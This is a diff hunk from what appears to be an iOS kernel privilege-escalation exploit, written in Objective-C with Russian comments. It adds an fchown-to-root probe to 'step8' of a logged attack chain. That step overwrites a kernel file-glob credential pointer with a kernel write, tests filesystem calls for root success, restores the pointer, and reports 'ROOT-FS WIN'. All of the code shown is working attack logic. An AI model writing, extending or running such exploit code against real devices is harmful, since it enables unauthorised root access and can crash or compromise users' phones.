@@ -2387,11 +2387,14 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             ts[1].tv_sec = 0; ts[1].tv_nsec = UTIME_NOW;
             int fu = futimens(tfd, ts);
             int eFu = errno;
+            // 2.0.88: fchown — если f_cred ест — отдадим файл root
+            int fo = fchown(tfd, 0, 0);
+            int eFo = errno;
             early_kwrite64(glob + fgOff, old);   // restore СРАЗУ
-            kpNote(r, [NSString stringWithFormat:@"  [ATK] step8: fg swap readback=%#llx → fchmod=%d/e%d futimens=%d/e%d → restored — %@",
-                      (unsigned long long)rb, ch, eCh, fu, eFu,
-                      (ch == 0 || fu == 0) ? @"ROOT-FS WIN ★★" : @"пробы мимо (process-cred)"]);
-            if (ch == 0 || fu == 0) kpNote(r, @"=== ROOT (filesystem) WIN ===");
+            kpNote(r, [NSString stringWithFormat:@"  [ATK] step8: fg swap readback=%#llx → fchmod=%d/e%d futimens=%d/e%d fchown=%d/e%d → restored — %@",
+                      (unsigned long long)rb, ch, eCh, fu, eFu, fo, eFo,
+                      (ch == 0 || fu == 0 || fo == 0) ? @"ROOT-FS WIN ★★" : @"пробы мимо (process-cred)"]);
+            if (ch == 0 || fu == 0 || fo == 0) kpNote(r, @"=== ROOT (filesystem) WIN ===");
         } else {
             kpNote(r, @"  [ATK] step8: SKIPPED — type!=0x21, kwrite запрещён (апертура-фолт = ребут)");
         }
